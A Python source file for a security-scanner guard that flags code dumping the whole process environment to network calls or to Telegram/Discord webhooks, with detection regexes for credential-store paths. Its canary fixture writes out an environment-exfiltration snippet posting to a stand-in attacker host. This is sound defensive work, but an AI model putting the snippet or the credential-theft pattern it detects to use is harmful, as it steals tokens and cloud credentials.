"""Guard: no code serializes the whole process environment (or reads a credential-store file)
and sends it to a network sink (checklist §8, new item).

Environment variables routinely hold CI tokens, cloud credentials, and API keys. A dependency,
AI-agent skill, or backdoored contribution that dumps the entire environment — or a well-known
credential-store file — and sends it anywhere over the network is a credential-stealer, not a
diagnostic helper (MITRE ATT&CK T1552.001, Credentials in Files; T1041, Exfiltration Over C2
Channel). Two independent shapes, ported from `rakshit-737/warden-supply-chain-security`'s
`warden-python.yml` semgrep rule (`environ-dump-to-network`) and `warden_exfiltration.yar`'s
Telegram/Discord rules (fetched and read in full):

  **`environ-dump-network-sink` (CRITICAL):** the whole `os.environ` is serialized
  (`json.dumps(dict(os.environ))`, `str(os.environ)`/`repr(os.environ)`, a dict comprehension
  over `os.environ.items()`) and that dump REACHES a network-send call (`requests.post/put/
  request`, `httpx.post/put`, `urllib`'s `urlopen`/`Request`, or `smtplib`'s `sendmail`); see
  "Narrower than same-file co-occurrence" below for what "reaches" means. A bare copy
  (`dict(os.environ)`, `os.environ.copy()`, `dict(os.environ.items())`) counts only as the send
  call's own argument, because a copy is what a subprocess `env=` takes. Reading one named
  variable (`os.environ["API_KEY"]`, `os.environ.get(...)`) is ordinary configuration and is not
  this shape — only serializing the WHOLE environment object is.

  **`credential-exfil-via-webhook` (CRITICAL):** a Telegram Bot API send call
  (`api.telegram.org/bot` + `sendDocument`/`sendMessage`/`sendPhoto`/`sendMediaGroup`) or a
  Discord webhook URL (`discord(app)?.com/api/webhooks/`), in the SAME FILE as either the
  environment-dump pattern above OR a reference to a well-known non-browser credential-store
  path (`.aws/credentials`, an SSH private key: `.ssh` and `id_rsa`/`id_dsa`/`id_ecdsa`/
  `id_ed25519` on one line, so `os.path.join(home, ".ssh", "id_rsa")` counts and the `.pub`
  public key does not, `.git-credentials`, `.docker/config.json`, `.kube/config`). A
  Telegram/Discord notification helper that reads only its OWN bot token from the environment,
  and never dumps the whole environment or opens a credential file, does not match — the
  source's own disclosed false-positive boundary. A bare environment copy is not this rule's
  dump signal (a notifier that spawns `subprocess.run(cmd, env=dict(os.environ))` is ordinary).
  `.npmrc`/`.pypirc` and a bare `id_rsa` mention with no `.ssh` are deliberately excluded here
  too, for the same reason `credential-file-path-reference` excludes them — Dean's review
  caught this guard firing CRITICAL on any Discord/Telegram notifier file that
  merely mentions either path.

**Narrower than same-file co-occurrence (fixed, review; widened back, PR #1093 round
2):** `environ-dump-network-sink` originally fired whenever a dump pattern and a network-send call
both appeared anywhere in the same file — an env dump kept for local debug logging plus any wholly
unrelated `requests.post` call (telemetry, a health ping, an unrelated API call) fired CRITICAL.
It now requires the dump to actually reach the send call: the dump (or a bare copy) is itself an
argument of the call (`requests.post(url, json=dict(os.environ))`), or a variable assigned by the
dump's STATEMENT appears as a value in the call's argument list. Every dump in the file is a
source; the statement may span lines (a dump nested in a multi-line dict literal assigns the
dict's variable); and up to three further assignments are followed (`d = json.dumps(...)`,
`body = d.encode()`, `requests.post(url, data=body)`). A typed assignment (`p: str = ...`) counts.
A keyword NAME (`data=`), a word inside a plain string literal and an attribute name
(`resp.data`) are not references to a variable called `data`; a keyword's value and an f-string
interpolation are (PR #1093 round 3). This is still not full dataflow taint (the source semgrep
rule's own scope): assignment order is ignored, attribute and subscript targets (`self.p = ...`,
`d["env"] = ...`) and one-line compound statements (`if c: p = ...`) are not followed, a value
passed through a function call's return is not traced, and only the first 8 KB of a send call's
arguments is read.

The source's YARA rule 3 (`WX-YARA-052`, environment dump + host-identity collection +
generic HTTP send, no bot/webhook requirement) is dropped: its core signal — an environment
dump next to a network send — is already the broader `environ-dump-network-sink` rule above,
and raw `socket.send`/`sendall`/`sendto` sinks are dropped from both rules here to avoid
chasing every unrelated `.send(...)` call in a file that also happens to dump environment
variables for a completely different reason (e.g. a startup diagnostics logger).

**Known limitation:** `environ-dump-network-sink`'s network-send half only recognizes Python
call shapes (`requests`/`httpx`/`urllib`/`smtplib`); a JS environment dump sent via `fetch()`/
`axios`/`XMLHttpRequest` is not yet wired in, so a pure-JS exfiltration chain is not detected
by this rule (the Telegram/Discord webhook rule has no such gap, since it checks the dump/
credential-path signal against a channel marker that is language-agnostic text). The JS dump
counts only when the `(` of `JSON.stringify(` is live code on the shared anchor mask
(`js_code_matches`, #1055): a `JSON.stringify(process.env)` spelled out in a warning string next
to a real webhook no longer fires CRITICAL, while a dump inside a `${...}` substitution still
counts. The webhook URL and the credential-store path are literals by nature and stay plain
matches.

Fires on Python/JS source when `python`/`javascript`/`typescript` is detected. Suppress an
audited case (a legitimate CI diagnostics/support-bundle tool with real user consent) with a
whole-file pragma comment anywhere in the file:

    # security: allow-environ-dump-to-network
"""
from __future__ import annotations

import keyword
import re
import tokenize
from bisect import bisect_right
from pathlib import Path

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import (
    CanaryPlant,
    Guard,
    close_paren_map,
    comment_dialect_for,
    is_nonproduct_path,
    iter_files,
    js_code_matches,
    pragma_present,
    read,
    rel,
    strip_js_comments,
    strip_python_line_comment,
    strip_python_strings,
)

_JS_SUFFIXES = (".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs")
_PY_SUFFIXES = (".py", ".pyi")

_ENV_DUMP_PY = re.compile(
    r"json\s*\.\s*dumps\s*\(\s*(?:dict\s*\(\s*)?os\s*\.\s*environ\b"
    r"|\b(?:str|repr)\s*\(\s*os\s*\.\s*environ\s*\)"
    r"|\{\s*os\s*\.\s*environ\s*\}"
    r"|\{[^{}]{0,80}\bos\s*\.\s*environ\s*\.\s*items\s*\(\s*\)[^{}]{0,80}\}",
    re.IGNORECASE,
)
# A bare COPY of the environment is what a subprocess `env=` takes, so it is ordinary on its own.
# It counts only when it is itself an argument of the network call (`json=os.environ.copy()`),
# and never as the webhook rule's exfil signal (PR #1093 round 2, H4).
_ENV_COPY_PY = re.compile(
    r"\bdict\s*\(\s*os\s*\.\s*environ\s*(?:\.\s*items\s*\(\s*\)\s*)?\)"
    r"|\bos\s*\.\s*environ\s*\.\s*copy\s*\(\s*\)",
    re.IGNORECASE,
)
_ENV_DUMP_JS = re.compile(r"JSON\s*\.\s*stringify\s*\(\s*process\s*\.\s*env\s*\)")


def _stringify_paren(m: re.Match[str]) -> int:
    """The `(` of a `_ENV_DUMP_JS` match's `JSON.stringify(`, the anchor `js_code_matches` tests."""
    return m.start() + m.group().index("(")


# The names a statement assigns, matched at the statement's first token: `payload = ...` ->
# payload, `a, b = ...` -> a, b, `payload: str = ...` -> payload. Used to check the dump actually
# REACHES a network-send call's own argument list, rather than merely co-occurring in the same
# file. The lookbehind keeps a search from restarting inside a word or a name list, which is what
# keeps the pattern linear. A keyword target (`else: x = ...` reads as `else` annotated) is
# dropped by the caller.
_ASSIGN_TARGETS = re.compile(r"(?<![\w,])(\w+(?:[ \t]*,[ \t]*\w+)*)[ \t]*(?::[^=\n]*)?=(?!=)")
# A keyword NAME inside a call (`data=`): blanked before reading a call's words, so a variable
# that happens to share the keyword's name does not count as passed.
_KWARG_NAME = re.compile(r"\b\w+[ \t]*=(?!=)")
# A name, not an attribute: `resp.data` is not a reference to a variable called `data`.
_WORD = re.compile(r"(?<![\w.])\w+")
# The tokens the by-name link reads as code. Everything else (strings, f-string text and format
# specs, comments) is blank in its view; an f-string's `{...}` expressions arrive as these tokens.
_CODE_TOKENS = frozenset({tokenize.NAME, tokenize.NUMBER, tokenize.OP})
_NON_STATEMENT_TOKENS = frozenset({
    tokenize.NL, tokenize.COMMENT, tokenize.INDENT, tokenize.DEDENT, tokenize.ENDMARKER, tokenize.ENCODING,
})
# Assignment hops followed from a dump (`d = dump; body = d.encode(); post(data=body)` is two).
_TAINT_HOPS = 3
# A network call's argument list longer than this is not a real request; capping the inspected
# span bounds the scan on a hostile file of deeply nested calls.
_MAX_ARG_CHARS = 8192

_NETWORK_SEND = re.compile(
    r"\brequests\s*\.\s*(?:post|put|request)\s*\("
    r"|\bhttpx\s*\.\s*(?:post|put)\s*\("
    r"|\burllib2?\s*\.\s*(?:request\s*\.\s*)?(?:urlopen|Request)\s*\("
    r"|\bsmtplib\s*\.\s*\w+\s*\(\s*\)\s*\.\s*sendmail\s*\(",
    re.IGNORECASE,
)

_TELEGRAM_API = re.compile(r"api\.telegram\.org/bot", re.IGNORECASE)
_TELEGRAM_SEND = re.compile(r"\bsend(?:Document|Message|Photo|MediaGroup)\b")
_DISCORD_WEBHOOK = re.compile(r"discord(?:app)?\.com/api/webhooks/", re.IGNORECASE)
_CREDENTIAL_STORE_PATH = re.compile(
    r"\.aws[\\/]credentials|\.aws['\"]\s*,\s*['\"]credentials['\"]"
    r"|\.ssh\b[^\n]{0,60}?\bid_(?:rsa|dsa|ecdsa|ed25519)\b(?!\.pub\b)|\.git-credentials"
    r"|\.docker[\\/]config\.json|\.kube[\\/]config\b",
    re.IGNORECASE,
)

_PRAGMA = "security: allow-environ-dump-to-network"
_STANDARDS = ["OWASP:A08", "CWE-200"]


def _code_view(text: str) -> tuple[str, list[tuple[int, int]]] | None:
    """Python's own tokenizer's reading of `text`, or None when it cannot read the file.

    Returns (view, statements). `view` is `text` with only NAME, NUMBER and OP tokens kept and
    everything else blanked to spaces (newlines kept, offsets unchanged): string and f-string
    text, format specs, prefixes, quotes, comments and docstrings. An f-string's `{...}`
    expressions arrive as ordinary tokens, so `f"{payload}"` keeps `payload`, while a dict key,
    URL word or `f"{row['data']}"` key is blank. `statements` is the (start, end) of each logical
    line (a NEWLINE token ends one). PR #1093 rounds 3-5 hand-rolled this reading three times and
    each disagreed with Python somewhere, so round 6 made the tokenizer (the test oracle) the
    implementation.

    Lines are tokenized de-indented, with columns mapped back: only INDENT/DEDENT read
    indentation, nothing here uses them, and that removes the TabError/IndentationError class
    (a Python 2 tab mix, round 7). Any other failure gives None, and the caller keeps only the
    inline check on the stripped text, as the first tokenizer version (round 6) did. A round-7
    attempt to blank the rejected line and retry turned an unterminated string's body into code
    (a false positive) and lost dumps on the blanked line (round 8), so it was removed. Never
    raises: tokenize can raise more than TokenError (a NUL after an indented block raised
    SystemError and took the guard down for the whole repo, round 7)."""
    src = " " + text[1:] if text.startswith("\ufeff") else text  # same length: a BOM is not code
    lines = src.split("\n")
    indents = [len(ln) - len(ln.lstrip(" \t\f")) for ln in lines]
    flat = [ln[k:] for ln, k in zip(lines, indents, strict=True)]
    line_starts = [0]
    for ln in lines[:-1]:
        line_starts.append(line_starts[-1] + len(ln) + 1)
    try:
        return _view_of(src, flat, indents, line_starts)
    except Exception:  # noqa: BLE001 - tokenize can raise far more than TokenError (round 7, H1)
        return None


def _view_of(
    src: str, flat: list[str], indents: list[int], line_starts: list[int]
) -> tuple[str, list[tuple[int, int]]]:
    """One tokenize pass over the de-indented lines `flat`; see `_code_view`. May raise."""
    chars = [c if c == "\n" else " " for c in src]
    statements: list[tuple[int, int]] = []
    start: int | None = None
    lines = iter(flat)

    def readline() -> str:
        line = next(lines, None)
        return "" if line is None else line + "\n"

    for tok in tokenize.generate_tokens(readline):
        if tok.type in _NON_STATEMENT_TOKENS:
            continue
        row, col = tok.start
        if row > len(line_starts):
            continue
        offset = line_starts[row - 1] + indents[row - 1] + col
        if tok.type == tokenize.NEWLINE:
            if start is not None:
                statements.append((start, offset))
            start = None
            continue
        if start is None:
            start = offset
        if tok.type in _CODE_TOKENS:  # never spans lines
            chars[offset:offset + len(tok.string)] = tok.string
    if start is not None:
        statements.append((start, len(src)))
    return "".join(chars), statements


class EnvironDumpToNetworkGuard(Guard):
    id = "environ-dump-to-network"
    title = "No code serializes the whole process environment and sends it to a network sink"
    area = "Code safety"

    # environ_exfil.py: json.dumps(dict(os.environ)) sent via requests.post -> fires
    # environ-dump-to-network/environ-dump-network-sink (CRITICAL).
    # Named environ_exfil.py, not exfil.py, to avoid colliding with dns-exfiltration-pattern's
    # own exfil.py plant (merge fallout -- both guards independently picked the same
    # filename; canary.py requires a shared plant file be owned by exactly one declaration).
    canary_plant = CanaryPlant(
        files={
            "environ_exfil.py": (
                "import json, requests\n"
                "payload = json.dumps(dict(os.environ))\n"
                "requests.post('https://attacker.example.com/collect', data=payload)\n"
            ),
        },
        expects=frozenset({"environ-dump-to-network/environ-dump-network-sink"}),
    )

    def applies(self, profile: StackProfile) -> bool:
        return bool({"python", "javascript", "typescript"} & profile.features)

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        seen: set[Path] = set()
        for f in iter_files(root, _PY_SUFFIXES + _JS_SUFFIXES):
            if f in seen:
                continue
            seen.add(f)
            if is_nonproduct_path(rel(root, f), profile.archive_segments):
                continue
            out.extend(self._scan(root, f))
        return out

    def _scan(self, root: Path, f: Path) -> list[Finding]:
        text = read(f)
        if not text or pragma_present(_PRAGMA, text, dialect=comment_dialect_for(f)):
            return []
        suffix = f.suffix.lower()
        sink_line: int | None = None
        if suffix in _PY_SUFFIXES:
            stripped = strip_python_strings(text, filename=f)
            code = "\n".join(strip_python_line_comment(ln) for ln in stripped.splitlines())
            env_dump = _ENV_DUMP_PY.search(code)
            cv = _code_view(text) if "environ" in text else None
            if cv is not None:
                # A `#` inside a string (`f"{d["#"]}"`) cuts `code`'s line; the view has no such
                # cut, so it can carry a dump `code` lost (round 7, M2).
                env_dump = env_dump or _ENV_DUMP_PY.search(cv[0])
            if env_dump or _ENV_COPY_PY.search(code) or (cv is not None and _ENV_COPY_PY.search(cv[0])):
                sink_line = self._dump_sent_line(cv, code)
        else:
            # JS: the network-send half is Python-only (the module docstring's known limitation).
            code = strip_js_comments(text, strip_strings=False)
            env_dump = _ENV_DUMP_JS.search(code)
            if env_dump:
                # The stringify call's `(` must be live code (#1055), so a dump named in a log or
                # warning string is not one; every match is tried, so a quoted copy cannot hide a
                # real dump after it.
                mask = strip_js_comments(text, strip_strings=True, keep_substitutions=True)
                env_dump = next(js_code_matches(_ENV_DUMP_JS, code, mask, anchor=_stringify_paren), None)

        out: list[Finding] = []
        if sink_line is not None:
            out.append(self._finding(
                root, f, sink_line, "environ-dump-network-sink",
                "This file serializes the whole process environment and sends it through a "
                "network call. Environment variables hold CI tokens and cloud credentials -- "
                "dumping all of them off-host is a common credential-stealer technique.",
            ))

        telegram_api = _TELEGRAM_API.search(code)
        webhook = _DISCORD_WEBHOOK.search(code)
        exfil_signal = env_dump or _CREDENTIAL_STORE_PATH.search(code)
        if telegram_api and _TELEGRAM_SEND.search(code) and exfil_signal:
            out.append(self._finding(
                root, f, self._lineno(code, telegram_api), "credential-exfil-via-webhook",
                "This file sends data through the Telegram Bot API from code that also dumps "
                "the environment or names a credential-store file.",
            ))
        elif webhook and exfil_signal:
            out.append(self._finding(
                root, f, self._lineno(code, webhook), "credential-exfil-via-webhook",
                "This file posts to a Discord webhook from code that also dumps the "
                "environment or names a credential-store file.",
            ))
        return out

    @staticmethod
    def _dump_sent_line(cv: tuple[str, list[tuple[int, int]]] | None, code: str) -> int | None:
        """The line of the dump that a network-send call actually carries, or None.

        A call carries a dump inline (a dump or a bare environment copy is one of its own
        arguments) or by name: a variable assigned in the dump's STATEMENT (so a dump nested in a
        multi-line dict literal counts), followed through up to `_TAINT_HOPS` further
        assignments (`body = d.encode()`). Every dump in the file is a source, not only the
        first. Same-file co-occurrence alone over-fired on an unrelated `requests.post`
; the narrower first version of this check dropped all three of those shapes
        (PR #1093 round 2, H3). Flow-insensitive: the order of the assignments is not checked.

        Both checks read `cv`, the tokenizer's reading of the file (`_code_view`). A file it cannot
        read at all gets the inline check only, on `code` (the stripped text the other rules
        read): there is no reliable statement or name structure to follow. Calls are taken in
        order, each checked inline and then by name, so the reported line is the first carried
        dump's."""
        if cv is None:
            return EnvironDumpToNetworkGuard._inline_sent_line(code, close_paren_map(code))
        view, stmts = cv
        line_starts = [0, *(m.end() for m in re.finditer("\n", view))]
        stmt_starts = [s for s, _ in stmts]

        # Every assignment statement, by its start: target names, rhs start, words of the rhs.
        assigns: dict[int, tuple[list[str], int, set[str]]] = {}
        for s, e in stmts:
            m = _ASSIGN_TARGETS.match(view, s, e)
            names = [n.strip() for n in m.group(1).split(",")] if m else []
            names = [n for n in names if not keyword.iskeyword(n)]
            if m and names:
                assigns[s] = (names, m.end(), set(_WORD.findall(view[m.end():e])))

        # Taint sources: names assigned by a statement whose right-hand side holds a dump.
        tainted: dict[str, int] = {}
        for dump in _ENV_DUMP_PY.finditer(view):
            i = bisect_right(stmt_starts, dump.start()) - 1
            assign = assigns.get(stmt_starts[i]) if i >= 0 else None
            if assign and dump.start() >= assign[1]:
                for name in assign[0]:
                    tainted.setdefault(name, bisect_right(line_starts, dump.start()))
        for _ in range(_TAINT_HOPS):
            grew = False
            for names, _rhs, words in assigns.values():
                hit = words & tainted.keys()
                if hit and any(n not in tainted for n in names):
                    origin = min(tainted[w] for w in hit)
                    for n in names:
                        tainted.setdefault(n, origin)
                    grew = True
            if not grew:
                break

        pairs = close_paren_map(view)
        for call in _NETWORK_SEND.finditer(view):
            open_idx = call.end() - 1
            close_idx = pairs.get(open_idx)
            if close_idx is None:
                continue
            span = view[open_idx:min(close_idx, open_idx + _MAX_ARG_CHARS)]
            inline = _ENV_DUMP_PY.search(span) or _ENV_COPY_PY.search(span)
            if inline:
                return bisect_right(line_starts, open_idx + inline.start())
            passed = set(_WORD.findall(_KWARG_NAME.sub(" ", span))) & tainted.keys()
            if passed:
                return min(tainted[n] for n in passed)
        return None

    @staticmethod
    def _inline_sent_line(code: str, pairs: dict[int, int]) -> int | None:
        """The line of a dump (or a bare environment copy) that is itself an argument of a
        network-send call in `code`, or None. `pairs` is `close_paren_map(code)`."""
        line_starts = [0, *(m.end() for m in re.finditer("\n", code))]
        for call in _NETWORK_SEND.finditer(code):
            open_idx = call.end() - 1
            close_idx = pairs.get(open_idx)
            if close_idx is None:
                continue
            span = code[open_idx:min(close_idx, open_idx + _MAX_ARG_CHARS)]
            inline = _ENV_DUMP_PY.search(span) or _ENV_COPY_PY.search(span)
            if inline:
                return bisect_right(line_starts, open_idx + inline.start())
        return None

    @staticmethod
    def _lineno(code: str, match: re.Match[str]) -> int:
        return code.count("\n", 0, match.start()) + 1

    def _finding(self, root: Path, f: Path, lineno: int, rule_suffix: str, message: str) -> Finding:
        return Finding(
            check_id=self.id,
            severity="critical",
            title=self.title,
            location=f"{rel(root, f)}:{lineno}",
            message=message,
            remediation=(
                "Never serialize the whole environment or read a credential-store file for "
                "network transmission. If this is a genuinely consented, user-initiated "
                f"diagnostics/support-bundle flow, mark it with `# {_PRAGMA}`."
            ),
            rule=f"environ-dump-to-network/{rule_suffix}",
            standards=list(_STANDARDS),
        )
